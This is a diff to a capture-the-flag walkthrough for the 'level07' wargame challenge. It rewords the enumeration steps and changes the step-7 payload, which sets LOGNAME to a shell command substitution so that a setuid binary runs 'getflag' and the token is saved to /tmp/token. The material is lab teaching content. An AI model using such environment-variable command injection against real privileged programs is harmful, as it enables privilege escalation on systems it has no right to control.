@@ -2,7 +2,7 @@
 
 ## Steps
 
-1. __Action__ (Guest): check the content of the `level07` user home directory once connected
+1. __Action__ (Guest): list the files present in the `level07` user's home directory
 	```sh
 	ls -A
 	```
@@ -13,14 +13,14 @@
 	.bash_logout  .bashrc  .profile  level07
 	```
 
-3. __Action__ (Guest): check the permissions of the `level07` file
+3. __Action__ (Guest): check the file access control list of the `level07` file
 	```sh
 	getfacl level07
 	```
 
 4. __Observation__ (Guest): the previous command reveals that the `level07` file:
-	- is readable by the `level07` group
-	- is executable by the `level07` group
+	- is readable by the `level07` user
+	- is executable by the `level07` user
 	- has the `setuid` and the `setgid` bits enabled
 	```
 	# file: level07
@@ -64,7 +64,7 @@
 7. __Action__ (Guest): execute the `level07` file with the `LOGNAME` environment variable set
 	to a command injection payload to run the `getflag` command and save the token to a file
 	```sh
-	env -i LOGNAME='$( getflag )' ./level07 | grep -oE '[^ ]+$' >/tmp/token
+	env -i LOGNAME='`getflag`' ./level07 | egrep -o '[^ ]+$' >/tmp/token
 	```
 
 8. __Action__ (Guest): check that the `token` file has been correctly created
